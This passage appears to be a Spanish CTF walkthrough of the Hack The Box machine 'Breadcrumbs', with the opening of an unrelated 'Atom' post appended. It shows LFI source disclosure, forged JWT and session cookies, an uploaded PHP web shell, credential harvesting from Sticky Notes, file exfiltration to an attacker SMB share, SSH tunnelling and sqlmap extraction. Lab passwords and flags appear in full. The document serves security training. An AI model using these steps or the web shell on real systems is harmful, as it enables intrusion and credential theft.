direcciones / y /portal/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  π ~/htb/breadcrumbs ❯ gobuster dir -u http://10.10.10.228/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q t 50 -x php,html,txt,xml,json /index.php (Status: 200) [Size: 2368] /books (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.228/books/] /php (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.228/php/] /portal (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.228/portal/] /css (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.228/css/] /includes (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.228/includes/] /db (Status: 301) [Size: 333] [--\u0026gt; http://10.10.10.228/db/] /examples (Status: 503) [Size: 401] /js (Status: 301) [Size: 333] [--\u0026gt; http://10.10.10.228/js/] /licenses (Status: 403) [Size: 420] π ~/htb/breadcrumbs ❯ gobuster dir -u http://10.10.10.228/portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q t 50 -x php,html,txt,xml,json /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2508] /uploads (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.228/portal/uploads/] /signup.php (Status: 200) [Size: 2735] /assets (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.228/portal/assets/] /php (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.228/portal/php/] /includes (Status: 301) [Size: 346] [--\u0026gt; http://10.10.10.228/portal/includes/] /db (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.228/portal/db/] /logout.php (Status: 302) [Size: 12] [--\u0026gt; login.php] /vendor (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.228/portal/vendor/] /cookie.php (Status: 200) [Size: 0]   PORTAL Registramos e ingresamos en el portal, observamos diferentes opciones, una de ellas está \u0026ldquo;deshabilitada\u0026rdquo;, tambien se muestran algunos problemas (Issues) que presenta la \u0026ldquo;plataforma\u0026rdquo;.\nTambien una lista de posibles nombres de usuarios y su posicion/rol dentro de la plataforma, se lista tambien nuestro usuario (user), finalmente en File management que al parecer no tenemos acceso ya que redirige nuevamente a la pagina principal.\nLFI Modificando los diferentes parametros de la busqueda de libros (/php/books.php), vemos un error el cual muestra que falta el \u0026ldquo;parametro\u0026rdquo; books y además se muestra file_get_contents lo que quiere decir que realiza la lectura de archivos y los presenta en la pagina.\nVerificamos esto en las opciones de busqueda de libros y vemos que al precionar la opcion de Reservar en /php/books.php envia el nombre de un archivo html, y muestra el contenido de este en un Modal.\nSOURCE CODE Utilizando esta informacion logramos obtener el codigo fuente de las paginas existentes y que enumeramos con Gobuster. Como por ejemplo el controlador de autenticacion (authController.php) en el cual incluye como se realiza una sesion (PHPSESSID) y lo que parece ser un token de JWT.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124  // book=../portal/authController.php\u0026amp;method=1 \u0026lt;?php require \u0026#39;db/db.php\u0026#39;; require \u0026#34;cookie.php\u0026#34;; require \u0026#34;vendor/autoload.php\u0026#34;; use FirebaseJWTJWT; $errors = array(); $username = \u0026#34;\u0026#34;; $userdata = array(); $valid = false; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; //if user clicks on login if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;) { if ($_POST[\u0026#39;method\u0026#39;] == 0) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = \u0026#34;SELECT username,position FROM users WHERE username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($query); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); while ($row = $result-\u0026gt;fetch_array(MYSQLI_ASSOC)) { array_push($userdata, $row); } $userCount = $result-\u0026gt;num_rows; $stmt-\u0026gt;close(); if ($userCount \u0026gt; 0) { $password = sha1($password); $passwordQuery = \u0026#34;SELECT * FROM users WHERE password=? AND username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($passwordQuery); $stmt-\u0026gt;bind_param(\u0026#39;ss\u0026#39;, $password, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { $valid = true; } $stmt-\u0026gt;close(); } if ($valid) { session_id(makesession($username)); session_start(); $secret_key = \u0026#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\u0026#39;; $data = array(); $payload = array( \u0026#34;data\u0026#34; =\u0026gt; array( \u0026#34;username\u0026#34; =\u0026gt; $username ) ); $jwt = JWT::encode($payload, $secret_key, \u0026#39;HS256\u0026#39;); setcookie(\u0026#34;token\u0026#34;, $jwt, time() + (86400 * 30) , \u0026#34;/\u0026#34;); $_SESSION[\u0026#39;username\u0026#39;] = $username; $_SESSION[\u0026#39;loggedIn\u0026#39;] = true; if ($userdata[0][\u0026#39;position\u0026#39;] == \u0026#34;\u0026#34;) { $_SESSION[\u0026#39;role\u0026#39;] = \u0026#34;Awaiting approval\u0026#34;; } else { $_SESSION[\u0026#39;role\u0026#39;] = $userdata[0][\u0026#39;position\u0026#39;]; } header(\u0026#34;Location: /portal\u0026#34;); } else { $_SESSION[\u0026#39;loggedIn\u0026#39;] = false; $errors[\u0026#39;valid\u0026#39;] = \u0026#34;Username or Password incorrect\u0026#34;; } } elseif ($_POST[\u0026#39;method\u0026#39;] == 1) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $passwordConf = $_POST[\u0026#39;passwordConf\u0026#39;]; if (empty($username)) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username Required\u0026#34;; } if (strlen($username) \u0026lt; 4) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username must be at least 4 characters long\u0026#34;; } if (empty($password)) { $errors[\u0026#39;password\u0026#39;] = \u0026#34;Password Required\u0026#34;; } if ($password !== $passwordConf) { $errors[\u0026#39;passwordConf\u0026#39;] = \u0026#34;Passwords don\u0026#39;t match!\u0026#34;; } $userQuery = \u0026#34;SELECT * FROM users WHERE username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($userQuery); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); $userCount = $result-\u0026gt;num_rows; $stmt-\u0026gt;close(); if ($userCount \u0026gt; 0) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username already exists\u0026#34;; } if (count($errors) === 0) { $password = sha1($password); $sql = \u0026#34;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, \u0026#39;\u0026#39;)\u0026#34;; $stmt = $con-\u0026gt;prepare($sql); $stmt-\u0026gt;bind_param(\u0026#39;ss\u0026#39;, $username, $password); if ($stmt-\u0026gt;execute()) { $user_id = $con-\u0026gt;insert_id; header(\u0026#39;Location: login.php\u0026#39;); } else { $_SESSION[\u0026#39;loggedIn\u0026#39;] = false; $errors[\u0026#39;db_error\u0026#39;] = \u0026#34;Database error: failed to register\u0026#34;; } } } }   MYSQL Tambien encontramos las credenciales de la base de datos, intentamos ingresar mediante el puerto mysql pero no fue posible, probablemente solo esten permitidas las conexiones locales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # book=../portal/db/db.php\u0026amp;method=1\u0026amp; # \u0026lt;?php #\t$host=\u0026#34;localhost\u0026#34;; #\t$port=3306; #\t$user=\u0026#34;bread\u0026#34;; #\t$password=\u0026#34;jUli901\u0026#34;; #\t$dbname=\u0026#34;bread\u0026#34;; #\t$con = new mysqli($host, $user, $password, $dbname, $port) or die (\u0026#39;Could not connect to the database server\u0026#39; . mysqli_connect_error()); # ?\u0026gt; π ~/htb/breadcrumbs ❯ mysql -h 10.10.10.228 -u bread -p Enter password: ERROR 1130 (HY000): Host \u0026#39;10.10.14.25\u0026#39; is not allowed to connect to this MariaDB server π ~/htb/breadcrumbs ❯   Paul - ADMIN Token \u0026amp; Session Enumerando los archivos del controlador de autenticacion (authController.php), encontramos fileController.php en el cual se indica como se valida el token jwt, mostrando la clave secreta, tambien se muestra el usuario \u0026ldquo;admin\u0026rdquo; paul.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  // book=../portal/includes/fileController.php\u0026amp;method=1 \u0026lt;?php $ret = \u0026#34;\u0026#34;; require \u0026#34;../vendor/autoload.php\u0026#34;; use FirebaseJWTJWT; session_start(); function validate(){ $ret = false; $jwt = $_COOKIE[\u0026#39;token\u0026#39;]; $secret_key = \u0026#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\u0026#39;; $ret = JWT::decode($jwt, $secret_key, array(\u0026#39;HS256\u0026#39;)); return $ret; } if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;){ $admins = array(\u0026#34;paul\u0026#34;); $user = validate()-\u0026gt;data-\u0026gt;username; if(in_array($user, $admins) \u0026amp;\u0026amp; $_SESSION[\u0026#39;username\u0026#39;] == \u0026#34;paul\u0026#34;){ error_reporting(E_ALL \u0026amp; ~E_NOTICE); $uploads_dir = \u0026#39;../uploads\u0026#39;; $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_POST[\u0026#39;task\u0026#39;]; if(move_uploaded_file($tmp_name, \u0026#34;$uploads_dir/$name\u0026#34;)){ $ret = \u0026#34;Success. Have a great weekend!\u0026#34;; }else{ $ret = \u0026#34;Missing file or title :(\u0026#34; ; } }else{ $ret = \u0026#34;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.\u0026#34;; } echo $ret; }   Asi mismo encontramos en cookie.php la forma en que se crea la cookie PHPSESSID.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // book=../portal/cookie.php\u0026amp;method=1 \u0026lt;?php /** * @param string $username Username requesting session cookie * * @return string $session_cookie Returns the generated cookie * * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * */ function makesession($username) { $max = strlen($username) - 1; $seed = rand(0, $max); $key = \u0026#34;s4lTy_stR1nG_\u0026#34; . $username[$seed] . \u0026#34;(!528./9890\u0026#34;; $session_cookie = $username . md5($key); return $session_cookie; }   Analizando el codigo fuente de cookie.php vemos que crea multiples \u0026ldquo;sesiones\u0026rdquo; en total 4, por lo que modificamos el codigo y creamos las 4 sesiones para paul.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  π ~/htb/breadcrumbs ❯ cat session.php \u0026lt;?php function makesession($username){ $max = strlen($username) - 1; //$seed = rand(0, $max); \u0026lt;-- sesion con n random entre 1 - 4 (longitud de \u0026#39;paul\u0026#39;) for ($i = 0; $i \u0026lt;= $max; $i++) { $key = \u0026#34;s4lTy_stR1nG_\u0026#34; . $username[$i] . \u0026#34;(!528./9890\u0026#34;; $session_cookie = $username . md5($key); echo $i . \u0026#39; : \u0026#39; . $session_cookie; echo \u0026#34;\\n\u0026#34;; } } makesession(\u0026#39;paul\u0026#39;); ?\u0026gt; π ~/htb/breadcrumbs ❯ php session.php 0 : paula2a6a014d3bee04d7df8d5837d62e8c5 1 : paul61ff9d4aaefe6bdf45681678ba89ff9d 2 : paul8c8808867b53c49777fe5559164708c3 3 : paul47200b180ccd6835d25d034eeb6e6390   Y utilizando jwt.io creamos un token para el usuario paul tomando de base el token de un usuario registrado y la clave secreta.\nModificando el PHPSESSID y Token Jwt en firefox logramos acceder al portal y a File management como admin, vemos la opcion para subir de archivos.\nWEB-SHELL Podemos realizar la lectura de archivos, por lo que verificamos el codigo fuente de la pagina de File management, y encontramos en fileController.php que los archivos son subidos y movidos a /portal/uploads/, aunque solamente acepta archivos .zip, creamos un archivo con una \u0026ldquo;mini webshell\u0026rdquo;.\n1  \u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt;   Seleccionamos el archivo y agregamos el task, interceptamos la solicitud con burpsuite y modificamos la extension del task .php.\nEjecutamos whoami y vemos que el usuario es www-data.\n1 2 3 4  π ~/htb/breadcrumbs ❯ curl -s \u0026#34;https://10.10.10.228/portal/uploads/auo.zip.php?cmd=whoami\u0026#34; -k breadcrumbs\\www-data breadcrumbs\\www-data π ~/htb/breadcrumbs ❯   Juliette - USER Enumerando los diferentes archivos logramos encontrar la contraseña de juliette.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  π ~/htb/breadcrumbs ❯ curl -s -k \u0026#34;https://10.10.10.228/portal/uploads/uo.zip.php?cmd=type%20..\\pizzaDeliveryUserData\\*\u0026#34; [... REDACTED ...] { \u0026#34;pizza\u0026#34; : \u0026#34;margherita\u0026#34;, \u0026#34;size\u0026#34; : \u0026#34;large\u0026#34;,\t\u0026#34;drink\u0026#34; : \u0026#34;water\u0026#34;, \u0026#34;card\u0026#34; : \u0026#34;VISA\u0026#34;, \u0026#34;PIN\u0026#34; : \u0026#34;9890\u0026#34;, \u0026#34;alternate\u0026#34; : { \u0026#34;username\u0026#34; : \u0026#34;juliette\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;jUli901./())!\u0026#34;, } }{ \u0026#34;pizza\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;size\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;drink\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;card\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;PIN\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;alternate\u0026#34; : { \u0026#34;username\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;null\u0026#34;, } } [... REDACTED ...] π ~/htb/breadcrumbs ❯   Utilizamos esta contraseña en el servicio SSH, logramos obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10  Microsoft Windows [Version 10.0.19041.746] (c) 2020 Microsoft Corporation. All rights reserved. juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;whoami breadcrumbs\\juliette juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;type Desktop\\user.txt 1aec9d6b37ed9be9b87db57e3add8767 juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;   Enumeracion SMB Access Verificamos el acceso en SMB, tenemos acceso de lectura al recurso Anouncements.\n1 2 3 4 5 6 7 8 9 10 11  π ~/htb/breadcrumbs ❯ crackmapexec smb -u juliette -p \u0026#39;jUli901./())!\u0026#39; --shares 10.10.10.228 SMB 10.10.10.228 445 BREADCRUMBS [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False) SMB 10.10.10.228 445 BREADCRUMBS [+] Breadcrumbs\\juliette:jUli901./())! SMB 10.10.10.228 445 BREADCRUMBS [+] Enumerated shares SMB 10.10.10.228 445 BREADCRUMBS Share Permissions Remark SMB 10.10.10.228 445 BREADCRUMBS ----- ----------- ------ SMB 10.10.10.228 445 BREADCRUMBS ADMIN$ Remote Admin SMB 10.10.10.228 445 BREADCRUMBS Anouncements READ SMB 10.10.10.228 445 BREADCRUMBS C$ Default share SMB 10.10.10.228 445 BREADCRUMBS Development SMB 10.10.10.228 445 BREADCRUMBS IPC$ READ Remote IPC   En el recurso solamente encontramos un archivo de texto pero no parece guiarnos a ningun lado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  π ~/htb/breadcrumbs ❯ smbclient \\\\\\\\10.10.10.228\\\\Anouncements -U juliette Enter WORKGROUP\\juliette\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Fri Jan 15 19:03:48 2021 .. D 0 Fri Jan 15 19:03:48 2021 main.txt A 306 Fri Jan 15 19:06:10 2021 5082961 blocks of size 4096. 1598433 blocks available smb: \\\u0026gt; get main.txt getting file \\main.txt of size 306 as main.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/breadcrumbs ❯ cat main.txt Rabbit Stew Celebration To celebrate the new library startup, a lunch will be held this upcoming Friday at 1 PM. Location: Room 201 block B Food: Rabbit Stew Hole Construction Please DO NOT park behind the contruction workers fixing the hole behind block A. Multiple complaints have been made.   Development - USER Enumeracion Enumerando las carpetas de Juliette vemos un archivo html: todo.html, el cual contiene una lista de tareas y el estado de cada una.\n1 2 3 4 5 6 7 8 9 10 11 12 13  PS C:\\Users\\juliette\\Desktop\u0026gt; dir Directory: C:\\Users\\juliette\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 12/9/2020 6:27 AM 753 todo.html -ar--- 6/1/2021 11:38 AM 34 user.txt PS C:\\Users\\juliette\\Desktop\u0026gt;   Sticky Notes Se destaca que las contraseñas podrian estar en Sticky Notes ya que el estado de esta tarea esta en progreso.\n1  Migrate passwords from the Microsoft Store Sticky Notes appli cation to our new password manager   Tambien se menciona un administrador de contraseñas que posiblemente sea una aplicacion dentro de la maquina.\n1  Add new features to password manager   Notes Data Encontramos como realizar un backup de Sticky Notes, vemos los archivos de informacion en C:\\Users\\juliette\\AppData\\Local\\Packages\n1 2 3 4 5 6 7 8 9 10 11 12  PS C:\\Users\\juliette\\AppData\\local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\u0026gt; dir Directory: C:\\Users\\juliette\\AppData\\local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/15/2021 4:10 PM 20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session -a---- 11/29/2020 3:10 AM 4096 plum.sqlite -a---- 1/15/2021 4:10 PM 32768 plum.sqlite-shm -a---- 1/15/2021 4:10 PM 329632 plum.sqlite-wal   Copiamos los archivos utilizando un servidor de samba, y utilizando sqlite3 logramos obtener las notas de la base de datos sqlite, aunque solo se muestran las contraseñas de los usuarios Juliette y Development. Además grepeando todos los archivos tambien se muestra algun tipo de historial de las notas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # sudo impacket-smbserver -smb2support share . # copy * \\\\10.10.14.25\\share\\ π ~/htb/breadcrumbs/tmp ❯ ll total 380K -rwxr-xr-x 1 root root 20K Jan 15 19:10 15cbbc93e90a4d56bf8d9a29305b8981.storage.session -rwxr-xr-x 1 root root 4.0K Jan 15 19:09 plum.sqlite -rwxr-xr-x 1 root root 32K Jan 15 19:10 plum.sqlite-shm -rwxr-xr-x 1 root root 322K Jan 15 19:10 plum.sqlite-wal π ~/htb/breadcrumbs/tmp ❯ sqlite3 SQLite version 3.34.1 2021-01-20 14:10:07 Enter \u0026#34;.help\u0026#34; for usage hints. Connected to a transient in-memory database. Use \u0026#34;.open FILENAME\u0026#34; to reopen on a persistent database. sqlite\u0026gt; .open plum.sqlite sqlite\u0026gt; .tables Media Stroke SyncState User Note StrokeMetadata UpgradedNote sqlite\u0026gt; select * from Note; \\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())! \\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g \\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122 sqlite\u0026gt;   Ingresamos a la maquina con las credenciales de development, enumeramos la maquina y vemos un archivo en C:\\Development.\n1 2 3 4 5 6 7 8 9 10 11 12  PS C:\\Development\u0026gt; dir Directory: C:\\Development Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/29/2020 3:11 AM 18312 Krypter_Linux PS C:\\Development\u0026gt;   Root - USER SMB Encontramos en el recurso Development de samba el mismo archivo (Krypter_Linux), dicho archivo es un ejecutable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  π ~/htb/breadcrumbs ❯ crackmapexec smb -u development -p \u0026#39;fN3)sN5Ee@g\u0026#39; --shares 10.10.10.228 SMB 10.10.10.228 445 BREADCRUMBS [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False) SMB 10.10.10.228 445 BREADCRUMBS [+] Breadcrumbs\\development:fN3)sN5Ee@g SMB 10.10.10.228 445 BREADCRUMBS [+] Enumerated shares SMB 10.10.10.228 445 BREADCRUMBS Share Permissions Remark SMB 10.10.10.228 445 BREADCRUMBS ----- ----------- ------ SMB 10.10.10.228 445 BREADCRUMBS ADMIN$ Remote Admin SMB 10.10.10.228 445 BREADCRUMBS Anouncements READ SMB 10.10.10.228 445 BREADCRUMBS C$ Default share SMB 10.10.10.228 445 BREADCRUMBS Development READ SMB 10.10.10.228 445 BREADCRUMBS IPC$ READ Remote IPC π ~/htb/breadcrumbs ❯ smbclient \\\\\\\\10.10.10.228\\\\Development -U development Enter WORKGROUP\\development\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jan 15 19:03:49 2021 .. D 0 Fri Jan 15 19:03:49 2021 Krypter_Linux A 18312 Sun Nov 29 06:11:56 2020 5082961 blocks of size 4096. 1596652 blocks available smb: \\\u0026gt; get Krypter_Linux getting file \\Krypter_Linux of size 18312 as Krypter_Linux (41.7 KiloBytes/sec) (average 41.7 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/breadcrumbs ❯ file Krypter_Linux Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped π ~/htb/breadcrumbs ❯ ./Krypter_Linux Krypter V1.2 New project by Juliette. New features added weekly! What to expect next update: - Windows version with GUI support - Get password from cloud and AUTOMATICALLY decrypt! *** No key supplied. USAGE: Krypter \u0026lt;key\u0026gt;   Krypter Verificamos el archivo utilizando Ghidra, vemos que dicho archivo realiza algun tipo de solicitud hacia la direccion passmanager.htb, dicha direccion no existe en los archivos de configuracion de xampp y etc\\hosts de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  if (local_28 != 0) { puts(\u0026#34;Requesting decryption key from cloud...\\nAccount: Administrator\u0026#34;); curl_easy_setopt(local_28,0x2712,\u0026#34;http://passmanager.htb:1234/index.php\u0026#34;); curl_easy_setopt(local_28,0x271f,\u0026#34;method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#34;); curl_easy_setopt(local_28,0x4e2b,WriteCallback); curl_easy_setopt(local_28,0x2711,local_58); local_2c = curl_easy_perform(local_28); curl_easy_cleanup(local_28); puts(\u0026#34;Server response:\\n\\n\u0026#34;); this = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,local_58); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)this, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); }   Al verificar el puerto 1234, vemos que está a la escucha localmente.\n1 2 3 4 5 6 7 8 9  PS C:\\Development\u0026gt; netstat -ano | select-string 1234 TCP 127.0.0.1:1234 0.0.0.0:0 LISTENING 2928 TCP 127.0.0.1:1234 127.0.0.1:61143 TIME_WAIT 0 TCP 127.0.0.1:1234 127.0.0.1:61145 FIN_WAIT_2 2928 TCP 127.0.0.1:61145 127.0.0.1:1234 CLOSE_WAIT 2056 PS C:\\Development\u0026gt;   Proxychains Obtuvimos el puerto localmente mediante SOCKS5 SSH tunnel y ProxyChains.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # ssh -D 1337 -q -C -N development@10.10.10.228 # fN3)sN5Ee@g π ~/htb/breadcrumbs ❯ cat /etc/proxychains4.conf |grep -v \u0026#34;#\u0026#34; strict_chain proxy_dns remote_dns_subnet 224 tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks4 127.0.0.1 1337   Al visitar el puerto 1234 con la solicitud que realiza el ejecutable vemos una clave AES (k19D193j.\u0026lt;19391(), tambien, esta \u0026ldquo;aplicacion/pagina\u0026rdquo; podria relacionarse con el nuevo administrador de contraseñas que se menciona en las tareas.\nSQLi - SQLMap Modificando la solicitud observamos un tipo de error en la solicitud, tomamos esto en cuenta para ejecutar SQLmap.\nObtuvimos informacion de la base de datos bread que incluye la contraseña encriptada en AES del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # proxychains4 -q sqlmap -u \u0026#34;http://127.0.0.1:1234/index.php?method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#34; --dbs --batch available databases [2]: [*] bread [*] information_schema Database: bread [1 table] +-----------+ | passwords | +-----------+ Database: bread Table: passwords [1 entry] +----+---------------+------------------+----------------------------------------------+ | id | account | aes_key | password | +----+---------------+------------------+----------------------------------------------+ | 1 | Administrator | k19D193j.\u0026lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= | +----+---------------+------------------+----------------------------------------------+   Utilizamos devglan para obtener la contraseña en texto plano.\nShell Ingresamos por SSH, obtuvimos una shell y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  Microsoft Windows [Version 10.0.19041.746] (c) 2020 Microsoft Corporation. All rights reserved. administrator@BREADCRUMBS C:\\Users\\Administrator\u0026gt;whoami breadcrumbs\\administrator administrator@BREADCRUMBS C:\\Users\\Administrator\u0026gt;powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\Administrator\u0026gt; cd .\\Desktop\\ PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/15/2021 4:03 PM passwordManager -ar--- 6/1/2021 11:38 AM 34 root.txt PS C:\\Users\\Administrator\\Desktop\u0026gt; cat .\\root.txt c7810478e810a3ab65532c0cb04fa740 PS C:\\Users\\Administrator\\Desktop\u0026gt;   ","description":"Breadcrumbs expone un sitio web donde descubrimos una vulnerabilidad LFI la cual nos proporcionó la informacion para obtener acceso como admin, para luego obtener credenciales y acceder por SSH. Obtuvimos acceso al siguiente usuario con credenciales en la aplicacion de Notas de Windows. Con Proxychains creamos un tunnel para acceder a una aplicacion donde encontramos la contraseña del administrador.","id":1,"section":"posts","tags":["lfi","jwt","smb","sticky notes","sqlite","proxychains","sqlmap"],"title":"Hack The Box - Breadcrumbs","uri":"https://sckull.github.io/posts/breadcrumbs/"},{"content":"  Atom presenta una aplicacion Electron. Explotamos una vulnerabilidad en un modulo de actualizacion que permitio ejecutar comandos a través de un archivo de actualizacion y acceso al servidor de actualizaciones. Obtuvimos credenciales a través de Portable Kanban lo que nos dio acceso a Redis donde encontramos la contraseña del administrador. Tambien, por medio de Redis escribimos una web shell que nos dio acceso privilegiado.\n   Nombre Atom      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.237   Maker MrR3boot    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.1, 4.7, 4.8, 5.2, 5.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 10, 5, 5, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, 